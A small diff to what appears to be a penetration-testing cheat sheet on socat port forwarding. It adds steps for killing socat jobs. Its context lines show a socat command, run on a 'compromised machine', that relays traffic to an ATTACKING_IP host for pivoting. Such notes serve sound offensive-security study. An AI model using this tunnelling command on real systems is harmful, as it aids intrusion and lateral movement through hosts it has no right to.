@@ -15,3 +15,9 @@ Download the binary in compromised host using curl/wget.
 
 ##### In Compromised Machine
 >./socat tcp-l:8000 tcp:ATTACKING_IP:7000 &
+
+#### Killing Socat Connections
+```
+jobs
+kill PID
+```
